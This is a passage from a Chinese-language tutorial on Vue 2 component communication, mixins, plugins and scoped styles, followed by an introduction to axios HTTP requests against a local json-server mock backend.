<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  inheritAttrs: false // 禁止将未声明的属性绑定到根元素</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;"></script></font>

3 注意事项

inheritAttrs 选项：在使用 $attrs 时，通常需要设置 inheritAttrs: false，这样可以避免未声明的属性被默认绑定到组件的根元素上，从而更精确地控制属性的传递。

事件传递的层级：虽然 $listeners 可以实现跨层级的事件传递，但过多的层级可能会使代码逻辑变得复杂，降低代码的可维护性。因此，在使用时要根据实际情况进行合理设计。

事件处理函数的作用域：事件处理函数的作用域始终是定义该函数的组件，即父组件。在多层传递过程中，不会改变事件处理函数的作用域。

### 3.4.10、<font style="color:#4F4F4F;">v-model</font>
在 Vue 2 中，v-model 是一个非常方便的指令，常用于实现表单输入的双向数据绑定。同时，它也可以用于自定义组件之间的通信，实现父组件和子组件之间的数据双向绑定。下面详细介绍其原理和使用方法。

##### （1）、基本原理
在原生表单元素上，v-model 本质上是 :value 和 @input 事件的语法糖。例如，对于一个 input 元素：

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <input v-model="message"></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      message: ''</font>

<font style="color:#595959;">    };</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

<font style="color:#4D4D4D;">上面的代码等同于：</font>

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <input :value="message" @input='message = $event.target.value'></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      message: ''</font>

<font style="color:#595959;">    };</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

##### <font style="color:#4F4F4F;">（1）在自定义组件中使用v-model</font>
<font style="color:#4D4D4D;">在自定义组件中使用 v-model，子组件需要接收一个 value prop 并触发一个 input 事件。  
</font><font style="color:#4D4D4D;">子组件 ChildComponent.vue</font>

<font style="color:#595959;"><template></font>

**// 子组件中进行三步 **

**// 1. :value='value'**

**// 2. @input="$emit('input', $event.target.value)" 这种情况下，事件一定要用input**

**  <input :value="value" @input="$emit('input', $event.target.value)">**

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

**// 传过来的值一定要用value接收**

**  props: ['value']**

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

<font style="color:#4D4D4D;">父组件 ParentComponent.vue</font>

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <p>父组件中的值: {{ parentValue }}</p></font>

**    // 父组件中通过v-model双向绑定一个变量**

**    <ChildComponent v-model="parentValue" />**

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import ChildComponent from './ChildComponent.vue';</font>



<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  components: {</font>

<font style="color:#595959;">    ChildComponent</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      parentValue: ''</font>

<font style="color:#595959;">    };</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

<font style="color:#4D4D4D;">在上述代码中，父组件通过 v-model 将 parentValue 传递给子组件，子组件接收 value prop 并在输入框输入内容时触发 input 事件，将新的值传递回父组件，从而实现双向数据绑定。</font>

<font style="color:#4D4D4D;">此外：</font>

<font style="color:#4D4D4D;">v-model 使用 value 作为 prop 和 input 作为事件。但你可以通过 model 选项来自定义 prop 和事件的名称。</font>

<font style="color:#4D4D4D;">一个组件可以支持多个 v-model 绑定，通过不同的 prop 和事件来实现。</font>

### 3.4.11、总结
面试题：请你说一说组件通讯？

| 组件关系 | 传递方式 |
| --- | --- |
| 父传子 | props，v-model，默认插槽，具名插槽,$parent |
| 子传父 | props，自定义事件，v-model,$refs,$children,作用域插槽 |
| 祖先与后代 | <font style="color:#4F4F4F;">$attrs / $listeners ,provide / inject</font> |
| 任意组件通讯 | $bus,pubsub，vuex |








### 《3.5、mixins&plugins&scoped》
### 3.5.1、mixins
#### 3.5.1.1、需求：
点击按钮，分别获取对应的组件信息

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433655683-20d635c5-0ab9-402e-bbf8-af64644365a8.png)

son.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h2>son组件</h2></font>

<font style="color:#595959;">        <h3>姓名：{{ name }}</h3></font>

<font style="color:#595959;">        <h3>年龄：{{ age }}</h3></font>

<font style="color:#595959;">        <button @click="getmsg">点我获取信息</button></font>

<font style="color:#595959;">        <hr></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'son',</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            name: '章三',</font>

<font style="color:#595959;">            age: 18,</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        getmsg() {</font>

<font style="color:#595959;">            console.log(this.name,this.age);</font>

<font style="color:#595959;">            </font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

通过代码发现，无论是在son.vue中，还是girl.vue中，实现点击获取信息的代码是一样的，逻辑也是一样的。**这样的代码就可以进行复用，用mixins配置进行混入，**

#### 3.5.1.2、实现的步骤
##### 1、第一步：提取
**单独定义一个mixin.js（一般和main.js在同级目录）**，代码如下：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433655964-c3d9f365-bd25-46bc-8d91-9905aa942301.png)mixins.js

**<font style="color:#595959;">//创文件并导出</font>**

**<font style="color:#595959;">export const getmsgMixins = {</font>**

**<font style="color:#595959;">  methods: {</font>**

**<font style="color:#595959;">    getmsg() {</font>**

**<font style="color:#595959;">      console.log(this.name, this.age);</font>**

**<font style="color:#595959;">    },</font>**

**<font style="color:#595959;">  },</font>**

**<font style="color:#595959;">};</font>**

##### 2、第二步：引入并使用
<font style="color:#595959;"><script></font>

<font style="color:#595959;">// </font>**<font style="color:#595959;">混入第二步、引入并使用</font>**

**<font style="color:#FF0000;">import { getmsgMixins } from '../mixins.js'</font>**

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'son',</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            name: '章三',</font>

<font style="color:#595959;">            age: 18,</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">   </font>**<font style="color:#595959;"> //混入第三步 使用mixins</font>**

<font style="color:#595959;">   </font>**<font style="color:#FF0000;"> mixins: [getmsgMixins]</font>**

<font style="color:#595959;">    // 混入第一步、提取  将逻辑代码提取到单独的minxis.js中</font>

<font style="color:#595959;">    </font>

<font style="color:#595959;">    // methods: {</font>

<font style="color:#595959;">    //     getmsg() {</font>

<font style="color:#595959;">    //         console.log(this.name,this.age);</font>



<font style="color:#595959;">    //     }</font>

<font style="color:#595959;">    // }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

以上演示的是方法methods的混入，实际上混入时没有限制，之前所学的配置项都可以混入。

#### 3.5.1.3、混入的冲突问题
1、如果在组件本身的方法名，跟mixins.js的方法名重复了，则会产生冲突吗

不会冲突，**<u>如果冲突了，会执行组件自身的，不会执行混入的</u>**

2、组件的生命周期函数和混入的生命周期函数冲突了？

**对于生命周期钩子函数来说，都有的话，采用叠加，先执行混入的，再执行自己的**。

<font style="color:#595959;"><script></font>

<font style="color:#595959;">// 混入第二步、引入并使用</font>

<font style="color:#595959;">import { getmsgMixins } from '../mixins.js'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">      ·····</font>

<font style="color:#595959;">    // 2、组件中的方法名跟混入的方法名重复了</font>

<font style="color:#595959;">    // methods: {</font>

<font style="color:#595959;">    //     getmsg(){</font>

<font style="color:#595959;">    //       console.log('我是另外一个getmsg函数');</font>

<font style="color:#595959;">          </font>

<font style="color:#595959;">    //     }</font>

<font style="color:#595959;">    // },</font>

<font style="color:#595959;">    // 3、生命周期函数重复了</font>

<font style="color:#595959;">    mounted(){</font>

<font style="color:#595959;">        console.log('我是son组件中的mounted函数');</font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

#### 3.5.1.4、全局混入
在main.js全局混入，通过Vue.mixin()注册

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433656729-2b50f744-ad0e-413b-8b2f-c29842400634.png)

### 3.5.2、plugins
给Vue做功能增强的。

怎么定义插件？以下是定义插件并暴露插件。**插件是一个对象，对象中必须有****<font style="color:#FF0000;">install方法</font>****，这个方法会被自动调用**。

插件一般都放到一个plugins.js文件中。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433657083-aee4c180-09fc-4a04-abb3-5855a079a101.png)

<font style="color:#595959;">// 每一个插件都是一个对象</font>

**<font style="color:#595959;">// 每一个插件对象中必须有一个install方法，这个install方法会被自动调用</font>**

**<font style="color:#595959;">// install方法中的参数：包括两个部分</font>**

**<font style="color:#595959;">// 第一部分：Vue构造函数</font>**

**<font style="color:#595959;">// 第二部分:可以接受用户在使用这个插件时传过来的数据，参数个数不限制</font>**

<font style="color:#595959;">const plugins1 = {</font>

<font style="color:#595959;">  </font>**<font style="color:#FF0000;">install(Vue, x, y, z)</font>**<font style="color:#595959;"> {</font>

<font style="color:#595959;">    console.log("今天你学习了吗？");</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">export default plugins1</font>

导入插件并使用插件：

在main.js引入，通过Vue.use()使用并传参

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433657468-d16179bb-c3ff-467d-ad80-1c09cb967fa6.png)

可以在控制台看到有关的输出，Vue构造函数以及传递的参数

先学会用插件，后面我们做项目的时候会使用很多插件。到时再体会插件存在的意义。

### 3.5.3、scoped
默认情况下，在vue组件中定义的样式最终会汇总到一块，如果样式名一致，会导致冲突，冲突发生后，以后来加载的组件样式为准。怎么解决这个问题？

**（1）、作用：让样式在局部生效，防止冲突**

**（2）、语法：< style scoped>**

<font style="color:#595959;"><style scoped></font>

<font style="color:#595959;">  .demo {</font>

<font style="color:#595959;">    background-color: skyblue;</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></style></font>

（3）、Vue中的webpack并没有安装最新版，导致有些插件也不能默认安装最新版本，如npm i less-loader@7,而不是最新版，

（4）、查看插件版本 npm view less-loader versions





**《axios的使用》**

# 1、axios的基本使用
## 1.1、简介
说到axios我们就不得不说下Ajax。在旧浏览器页面在向服务器请求数据时，因为返回的是整个页面的数据，页面都会强制刷新一下，这对于用户来讲并不是很友好。并且我们只是需要修改页面的部分数据，但是从服务器端发送的却是整个页面的数据，十分消耗网络资源。而我们只是需要修改页面的部分数据，也希望不刷新页面，因此**异步网络请求**就应运而生。

Ajax(Asynchronous JavaScript and XML)：

异步网络请求。Ajax能够让页面无刷新的请求数据。

实现ajax的方式有多种，如jQuery封装的ajax，原生的XMLHttpRequest，以及axios。但各种方式都有利弊：

+ 原生的XMLHttpRequest的配置和调用方式都很繁琐，实现异步请求十分麻烦
+ jQuery的ajax相对于原生的ajax是非常好用的，但是没有必要因为要用ajax异步网络请求而引用jQuery框架
+ Axios（ajax i/o system）：

这不是一种新技术，本质上还是对原生XMLHttpRequest的封装，可用于浏览器和nodejs的HTTP客户端，只不过它是基于Promise的，符合最新的ES规范。

axios具备以下特点：

在浏览器中创建XMLHttpRequest请求

在node.js中发送http请求

支持Promise API

拦截请求和响应

转换请求和响应数据

取消要求

自动转换JSON数据

## 1.2、安装
### 1.2.1、<font style="color:#B4B4B4;">通过cdn引入</font>
<font style="color:#595959;"><script src="https://unpkg.com/axios/dist/axios.min.js"></script></font>

## 1.3、基本使用
### 1.3.1、准备服务器
模拟服务器，这里使用json-server

#### （1）安装json-server
<font style="color:#595959;">npm install -g json-server</font>

#### （2）创建数据源
在空文件夹下创建JSON文件作为数据源，例如 db.json

<font style="color:#595959;">{</font>

<font style="color:#595959;">  "list": [</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      "id": "1",</font>

<font style="color:#595959;">      "name": "唐僧",</font>

<font style="color:#595959;">      "age": 20,</font>

<font style="color:#595959;">      "address": "东土大唐"</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      "id": "2",</font>

<font style="color:#595959;">      "name": "孙悟空",</font>

<font style="color:#595959;">      "age": 500,</font>

<font style="color:#595959;">      "address": "花果山"</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      "id": "3",</font>

<font style="color:#595959;">      "name": "猪八戒",</font>

<font style="color:#595959;">      "age": 330,</font>

<font style="color:#595959;">      "address": "高老庄"</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      "id": "4",</font>

<font style="color:#595959;">      "name": "沙悟净",</font>

<font style="color:#595959;">      "age": 200,</font>

<font style="color:#595959;">      "address": "流沙河"</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      "id": "5",</font>

<font style="color:#595959;">      "name": "红孩儿",</font>

<font style="color:#595959;">      "age": 10,</font>

<font style="color:#595959;">      "address": "火焰山"</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  ]</font>

<font style="color:#595959;">}</font>

#### （3）启动服务器
使用以下命令启动json-server，并将JSON文件作为参数传递给服务器。这将在本地计算机的<font style="color:#C7254E;">3000端口</font>上启动服务器，并将db.json文件中的数据暴露为RESTful API。

方式一、//db.json是文件名

<font style="color:#595959;">json-server  db.json </font>

方式二、

<font style="color:#595959;">json-server --watch db.json  </font>

方式三、

跟db.json同级目录，创建package.json文件，配置别名

<font style="color:#595959;">{</font>

<font style="color:#595959;">    "scripts":{</font>

<font style="color:#595959;">        "mock":"json-server --watch db.json"</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

启动方式：npm run mock

### 1.3.2、各种请求方式
#### <font style="color:#B4B4B4;">1.3.2.1、get请求</font>
<font style="color:#B4B4B4;">获取数据，请求指定的信息，返回实体对象</font>

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">    <!-- <script src="https://unpkg.com/axios/dist/axios.min.js"></script> --></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      #warp {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 50px auto;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .showUser {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 10px auto;</font>

<font style="color:#595959;">        height: 260px;</font>

<font style="color:#595959;">        border: 1px solid red;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      li {</font>

<font style="color:#595959;">        line-height: 2;</font>

<font style="color:#595959;">        background-color: pink;</font>

<font style="color:#595959;">        margin: 10px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="warp"></font>

<font style="color:#595959;">      <button onclick="getInfo()">get请求</button></font>

<font style="color:#595959;">      <ul class="showUser"></ul></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // get请求</font>

<font style="color:#595959;">      async function getInfo() {</font>

<font style="color:#595959;">        // 请求结果处理方法一：</font>

<font style="color:#595959;">        // axios.get("http://localhost:3000/list").then(</font>

<font style="color:#595959;">        //   (res) => {</font>

<font style="color:#595959;">        //     // 将请求到的结果进行渲染</font>

<font style="color:#595959;">        //     render(res.data);</font>

<font style="color:#595959;">        //   },</font>

<font style="color:#595959;">        //   (err) => {</font>

<font style="color:#595959;">        //     console.log(err);</font>

<font style="color:#595959;">        //   }</font>

<font style="color:#595959;">        // );</font>

<font style="color:#595959;">        // 请求结果处理方法二：</font>

<font style="color:#595959;">        // axios</font>

<font style="color:#595959;">        //   .get("http://localhost:3000/list")</font>

<font style="color:#595959;">        //   .then((res) => {</font>

<font style="color:#595959;">        //     // 将请求到的结果进行渲染</font>

<font style="color:#595959;">        //     render(res.data);</font>

<font style="color:#595959;">        //   })</font>

<font style="color:#595959;">        //   .catch((err) => {</font>

<font style="color:#595959;">        //     console.log(err);</font>

<font style="color:#595959;">        //   });</font>

<font style="color:#595959;">        // 请求结果处理方法三：推荐使用第三种</font>

<font style="color:#595959;">        try {</font>

<font style="color:#595959;">          let res = await axios.get("http://localhost:3000/list");</font>

<font style="color:#595959;">          render(res.data);</font>

<font style="color:#595959;">        } catch (error) {</font>

<font style="color:#595959;">          console.log(err);</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      // 渲染函数</font>

<font style="color:#595959;">      function render(data) {</font>

<font style="color:#595959;">        let showUser = document.querySelector(".showUser");</font>

<font style="color:#595959;">        let str = "";</font>

<font style="color:#595959;">        data.forEach((item) => {</font>

<font style="color:#595959;">          str += `<li>${item.name}<a href='#'>删除</a></li>`;</font>

<font style="color:#595959;">        });</font>

<font style="color:#595959;">        showUser.innerHTML = str;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

此外get请求，还可以携带参数

<font style="color:#595959;">// get请求带参数方式一</font>

<font style="color:#595959;">// try {</font>

<font style="color:#595959;">//   let res = await axios.get("http://localhost:3000/list?id=1");</font>

<font style="color:#595959;">//   render(res.data);</font>

<font style="color:#595959;">// } catch (error) {</font>

<font style="color:#595959;">//   console.log(err);</font>

<font style="color:#595959;">// }</font>

<font style="color:#595959;">// get请求带参数方式二</font>

<font style="color:#595959;">try {</font>

<font style="color:#595959;">  let res = await axios.get("http://localhost:3000/list", {</font>

<font style="color:#595959;">    params: {</font>

<font style="color:#595959;">      id: 2,</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  });</font>

<font style="color:#595959;">  render(res.data);</font>

<font style="color:#595959;">} catch (error) {</font>

<font style="color:#595959;">  console.log(err);</font>

<font style="color:#595959;">}</font>

#### <font style="color:#B4B4B4;">1.3.2.2、post请求：</font>
<font style="color:#B4B4B4;">向指定资源提交数据（例如表单提交或文件上传）</font>

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      #warp {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 50px auto;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .showUser {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 10px auto;</font>

<font style="color:#595959;">        height: 260px;</font>

<font style="color:#595959;">        border: 1px solid red;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      li {</font>

<font style="color:#595959;">        line-height: 2;</font>

<font style="color:#595959;">        background-color: pink;</font>

<font style="color:#595959;">        margin: 10px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="warp"></font>

<font style="color:#595959;">      <button onclick="postInfo()">post请求</button></font>

<font style="color:#595959;">      <ul class="showUser"></ul></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // post请求</font>

<font style="color:#595959;">      async function postInfo() {</font>

<font style="color:#595959;">        await axios.post("http://localhost:3000/list", </font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">          name: "蜘蛛精",</font>

<font style="color:#595959;">          age: 200,</font>

<font style="color:#595959;">          address: "盘丝洞",</font>

<font style="color:#595959;">        });</font>

<font style="color:#595959;">        // 重新获取数据，渲染</font>

<font style="color:#595959;">        let res = await axios.get("http://localhost:3000/list");</font>

<font style="color:#595959;">        render(res.data);</font>

<font style="color:#595959;">        // console.log(res.data);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      // 渲染函数</font>

<font style="color:#595959;">      function render(data) {</font>

<font style="color:#595959;">        let showUser = document.querySelector(".showUser");</font>

<font style="color:#595959;">        let str = "";</font>

<font style="color:#595959;">        data.forEach((item) => {</font>

<font style="color:#595959;">          str += `<li>${item.name}<a href='#'>删除</a></li>`;</font>

<font style="color:#595959;">        });</font>

<font style="color:#595959;">        showUser.innerHTML = str;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

#### <font style="color:#B4B4B4;">1.3.2.3、put请求：</font>
<font style="color:#B4B4B4;">更新数据，从客户端向服务器传送的数据取代指定的文档的内容</font>

<font style="color:#B4B4B4;">会把更新的数据完全替代原数据，如果只修改了部分的数据，原数据其他内容都会丢失</font>

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      #warp {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 50px auto;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .showUser {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 10px auto;</font>

<font style="color:#595959;">        height: 260px;</font>

<font style="color:#595959;">        border: 1px solid red;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      li {</font>

<font style="color:#595959;">        line-height: 2;</font>

<font style="color:#595959;">        background-color: pink;</font>

<font style="color:#595959;">        margin: 10px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="warp"></font>

<font style="color:#595959;">      <button onclick="putInfo()">put请求-修改数据</button></font>

<font style="color:#595959;">      <ul class="showUser"></ul></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // put请求</font>

<font style="color:#595959;">      async function putInfo() {</font>

<font style="color:#595959;">        let res = await axios.put("http://localhost:3000/list/1", {</font>

<font style="color:#595959;">          name: "玉皇大帝",</font>

<font style="color:#595959;">        });</font>

<font style="color:#595959;">        // 渲染</font>

<font style="color:#595959;">        getData()</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      // 重新获取数据，渲染</font>

<font style="color:#595959;">      async function getData() {</font>

<font style="color:#595959;">        let res = await axios.get("http://localhost:3000/list");</font>

<font style="color:#595959;">        render(res.data);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      // 渲染函数</font>

<font style="color:#595959;">      function render(data) {</font>

<font style="color:#595959;">        let showUser = document.querySelector(".showUser");</font>

<font style="color:#595959;">        let str = "";</font>

<font style="color:#595959;">        data.forEach((item) => {</font>

<font style="color:#595959;">          str += `<li>${item.name}<a href='#'>删除</a></li>`;</font>

<font style="color:#595959;">        });</font>

<font style="color:#595959;">        showUser.innerHTML = str;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

#### <font style="color:#B4B4B4;">1.3.2.4、patch请求：</font>
<font style="color:#B4B4B4;">更新数据，是对put方法的补充，用来对已知资源进行局部更新</font>

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      #warp {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 50px auto;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .showUser {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 10px auto;</font>

<font style="color:#595959;">        height: 260px;</font>

<font style="color:#595959;">        border: 1px solid red;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      li {</font>

<font style="color:#595959;">        line-height: 2;</font>

<font style="color:#595959;">        background-color: pink;</font>

<font style="color:#595959;">        margin: 10px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="warp"></font>

<font style="color:#595959;">      <button onclick="patchInfo()">patch请求-修改数据</button></font>

<font style="color:#595959;">      <ul class="showUser"></ul></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // patch请求</font>

<font style="color:#595959;">      async function patchInfo() {</font>

<font style="color:#595959;">        let res = await axios.patch("http://localhost:3000/list/2", {</font>

<font style="color:#595959;">          name: "王母娘娘",</font>

<font style="color:#595959;">        });</font>

<font style="color:#595959;">        // 渲染</font>

<font style="color:#595959;">        getData();</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      // 重新获取数据，渲染</font>

<font style="color:#595959;">      async function getData() {</font>

<font style="color:#595959;">        let res = await axios.get("http://localhost:3000/list");</font>

<font style="color:#595959;">        render(res.data);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      // 渲染函数</font>

<font style="color:#595959;">      function render(data) {</font>

<font style="color:#595959;">        let showUser = document.querySelector(".showUser");</font>

<font style="color:#595959;">        let str = "";</font>

<font style="color:#595959;">        data.forEach((item) => {</font>

<font style="color:#595959;">          str += `<li>${item.name}<a href='#'>删除</a></li>`;</font>

<font style="color:#595959;">        });</font>

<font style="color:#595959;">        showUser.innerHTML = str;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

#### <font style="color:#B4B4B4;">1.3.2.5、delete请求：</font>
<font style="color:#B4B4B4;">请求服务器删除指定的数据</font>

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      #warp {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 50px auto;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .showUser {</font>

<font style="color:#595959;">        width: 400px;</font>

<font style="color:#595959;">        margin: 10px auto;</font>

<font style="color:#595959;">        height: 260px;</font>

<font style="color:#595959;">        border: 1px solid red;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      li {</font>

<font style="color:#595959;">        line-height: 2;</font>

<font style="color:#595959;">        background-color: pink;</font>

<font style="color:#595959;">        margin: 10px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="warp"></font>

<font style="color:#595959;">      <button onclick="deleteInfo()">delet请求-修改数据</button></font>

<font style="color:#595959;">      <ul class="showUser"></ul></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // delete请求</font>

<font style="color:#595959;">      async function deleteInfo() {</font>

<font style="color:#595959;">        let res = await axios.delete("http://localhost:3000/list/1");</font>

<font style="color:#595959;">        // 渲染</font>

<font style="color:#595959;">        getData();</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      // 重新获取数据，渲染</font>

<font style="color:#595959;">      async function getData() {</font>

<font style="color:#595959;">        let res = await axios.get("http://localhost:3000/list");</font>

<font style="color:#595959;">        render(res.data);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      // 渲染函数</font>

<font style="color:#595959;">      function render(data) {</font>

<font style="color:#595959;">        let showUser = document.querySelector(".showUser");</font>

<font style="color:#595959;">        let str = "";</font>

<font style="color:#595959;">        data.forEach((item) => {</font>

<font style="color:#595959;">          str += `<li>${item.name}<a href='#'>删除</a></li>`;</font>

<font style="color:#595959;">        });</font>

<font style="color:#595959;">        showUser.innerHTML = str;</font>
